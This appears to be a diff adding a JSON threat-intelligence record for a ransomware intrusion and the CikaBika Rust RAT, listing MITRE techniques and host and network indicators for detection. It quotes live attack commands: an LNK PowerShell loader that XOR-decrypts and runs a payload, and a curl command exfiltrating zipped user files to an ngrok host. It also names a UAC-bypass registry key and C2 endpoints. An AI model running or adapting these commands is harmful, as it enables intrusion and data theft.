@@ -1,0 +1,389 @@
+{
+  "malware_family": "CikaBika",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "Darktrace reports an unattributed multi-stage ransomware intrusion (Sliver C2, Nmap scanning, DCSync via drsuapi::DRSGetNCChanges, PSExec/WMI/RDP lateral movement, SMBv1 encryption) with C2 to Vultr VPS 137.220.59.55 and data exfiltration to Wasabi cloud storage. The same page also documents CikaBika, a Rust RAT delivered by a Nim loader via a malicious LNK that stages a fake dbghelp.dll into Edge's directory through a ms-settings UAC bypass and uses Discord channels plus ngrok for C2 and exfiltration. Detection anchors include the Sliver JA3 d6828e30ab66774a91a96ae93be4ae4c, Sliver/Vultr and Wasabi endpoints, the %TEMP%\\IfyuUapz.txt payload path, the ms-settings registry hijack key, and the RAT's !shell/!download Discord command set.",
+  "mitre_techniques": [
+    "T1041",
+    "T1046",
+    "T1018",
+    "T1135",
+    "T1083",
+    "T1071.001",
+    "T1572",
+    "T1212",
+    "T1110",
+    "T1210",
+    "T1021",
+    "T1080",
+    "T1112",
+    "T1078",
+    "T1486",
+    "T1489",
+    "T1190",
+    "T1595",
+    "T1588",
+    "T1070",
+    "T1070.004",
+    "T1204.002",
+    "T1036.007",
+    "T1036.005",
+    "T1059.001",
+    "T1059.003",
+    "T1027",
+    "T1027.013",
+    "T1140",
+    "T1548.002",
+    "T1574.001",
+    "T1082",
+    "T1016",
+    "T1057",
+    "T1113",
+    "T1102.002",
+    "T1560.001",
+    "T1567",
+    "T1218.010",
+    "T1005",
+    "T1074.001",
+    "T1564.003"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "-WindowStyle Hidden Start-Process 'Presentation_Generale.pdf.pdf' -WindowStyle Minimized;$data=[IO.File]::ReadAllBytes('Presentation_Generale.pdf.pdf');$key=$data[239];$file=$env:TEMP+'\\IfyuUapz.txt';$xdata = ($data[144305..5726256] | ForEach-Object { $_ -bxor $key });[IO.File]::WriteAllBytes($file, $xdata);cmd /c $file",
+      "context": "PowerShell embedded in malicious LNK; XOR-decrypts payload from PDF offset 239 (0x20)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\IfyuUapz.txt",
+      "context": "Decrypted Nim loader dropped by the LNK script, executed with cmd /c",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\dbghelp.dll",
+      "context": "Malicious Rust DLL planted via Edge DLL search-order hijacking",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\dbghelp.tmp",
+      "context": "Staged copy of malicious DLL before move into protected Edge directory",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
+      "context": "UAC bypass: computerdefaults.exe launch triggers DLL move command",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "computerdefaults.exe",
+      "context": "Launched to trigger ms-settings shell open command UAC bypass",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "regsvr32.exe",
+      "context": "Fallback invoked to load the malicious DLL if loadLib fails",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "msedge.exe",
+      "context": "Legitimate Edge binary delay-loads dbghelp.dll, abused for sideloading",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "import_name",
+      "value": "ShowWindow",
+      "context": "user32.dll call in C# helper to hide Windows Settings/ApplicationFrameHost windows",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "!shell powershell -Command \"Compress-Archive -Path 'C:\\Users\\<redacted>' -DestinationPath 'C:\\Users\\<redacted>' -Force\" && curl -X POST https://0487-105-96-75-236.ngrok-free.app/upload?filename=jdid1.zip -H \"Content-Type: application/octet-stream\" --data-binary \"@C:\\Users\\<redacted>\"",
+      "context": "Operator command sent in victim Discord channel to ZIP a directory and exfil it via ngrok",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Available commands: !shell, !src, !info, !download, !upload, !sysinfo, !stream, !camera, !broadcast, !isOn",
+      "context": "RAT command set advertised in Discord channel",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Device is ready for manual commands",
+      "context": "RAT status message posted to Discord before command list",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "MTQzMjcyMjA4Mzk5NzAyODUxMg.GJpNS2.CE19P",
+      "context": "Discord bot token embedded in Rust RAT (truncated in figure)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "1440633973104705547",
+      "context": "Discord application/guild ID constant referenced alongside channels API URL",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "جهاز جديد تم تسجيله بنجاح",
+      "context": "Arabic Discord registration message title for newly infected device",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Device Management System",
+      "context": "Footer of the Discord device-registration embed",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "tasklist_startup.txt",
+      "context": "Recon output file created by RAT after running tasklist",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "network_info.txt",
+      "context": "Recon output file (ipconfig) uploaded to Discord channel",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "https://discord.com/api/v10/channels/",
+      "context": "Discord API base used by RAT for per-device command channels",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "PSEXESVC.exe",
+      "context": "Ransomware operator deployed via ADMIN$ shares for lateral movement",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "drsuapi::DRSGetNCChanges",
+      "context": "AD replication abuse (DCSync) observed for credential extraction",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Delete.me",
+      "context": "File observed during reconnaissance activity, commonly associated with NetScan",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd /c %TEMP%\\IfyuUapz.txt",
+      "context": "LNK-spawned PowerShell executes decrypted loader via cmd /c",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ja3",
+      "value": "d6828e30ab66774a91a96ae93be4ae4c",
+      "context": "JA3 client hash linked to Sliver C2 beaconing and Wasabi exfil connections",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "137.220.59.55",
+      "context": "Sliver C2 infrastructure, Vultr VPS ASN AS20473",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://0487-105-96-75-236.ngrok-free.app/upload?filename=jdid1.zip",
+      "context": "ngrok exfiltration endpoint receiving ZIP from victim",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "safedata.s3.wasabisys.com",
+      "context": "Wasabi cloud storage endpoint used for data exfiltration (>200 MB)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "*.wasabisys.com",
+      "context": "Associated Wasabi cloud storage infrastructure",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "38.27.106.123",
+      "context": "Wasabi cloud storage endpoint associated with potential data exfiltration",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "38.27.106.128",
+      "context": "Wasabi cloud storage endpoint associated with potential data exfiltration",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "38.27.106.117",
+      "context": "Wasabi cloud storage endpoint associated with potential data exfiltration",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://discord.com/api/v10/channels/",
+      "context": "Discord C2 API endpoint used to create/read per-victim channels",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://cdn.discordapp.com/attachments/148648516",
+      "context": "Discord attachment URL for uploaded recon file network_info.txt (URL truncated in figure)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ipify.com",
+      "context": "Service queried by RAT to retrieve victim public IP during registration",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "discord.com",
+      "context": "Legitimate service abused as RAT command-and-control platform",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "script",
+    "document",
+    "archive"
+  ]
+}
